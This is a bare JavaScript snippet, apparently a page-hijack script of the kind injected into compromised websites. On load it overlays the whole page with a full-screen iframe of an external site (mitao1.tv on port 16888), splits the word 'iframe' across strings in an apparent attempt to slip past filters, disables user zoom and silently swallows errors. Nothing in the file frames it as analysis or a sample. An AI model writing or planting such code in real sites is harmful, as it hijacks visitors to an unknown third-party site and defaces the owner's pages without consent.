(function() {
    var urlArr = [
        'https://mitao1.tv:16888/'
    ];
    var _url = urlArr[randomRange(urlArr.length)];
    setFrame(_url);

    function setFrame(olink){
      var ss = '<div id="showcloneshengxiaon" style="height: 100%; width: 100%; background-color: rgb(255, 255, 255); background-position: initial; background-repeat: initial;"><ifr'
        + 'ame scrolling="yes" marginheight=0 marginwidth=0  frameborder="0" width="100%" height="100%" src="'+olink+'"></iframe></div><style type="text/css">html{width:100%;height:100%;}body {width:100%;height:100%;margin: 0;}</style>';
      setTimeout(function() {
        try {
          var _body = document.getElementsByTagName('body')[0];
          if(_body){
            document.getElementsByTagName('body')[0].insertAdjacentHTML('beforeend', ss);
          }else{
            setTimeout(function() {
              document.getElementsByTagName('body')[0].insertAdjacentHTML('beforeend', ss);
            }, 1000)
          }
          var oMeta = document.createElement('meta');
          oMeta.name = 'viewport';
          oMeta.content = 'width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no';
          document.getElementsByTagName('head')[0].appendChild(oMeta);
        } catch (e) {}
      }, 200)
    }
    function randomRange(max) {
      return Math.floor(Math.random() * max);
    }
})();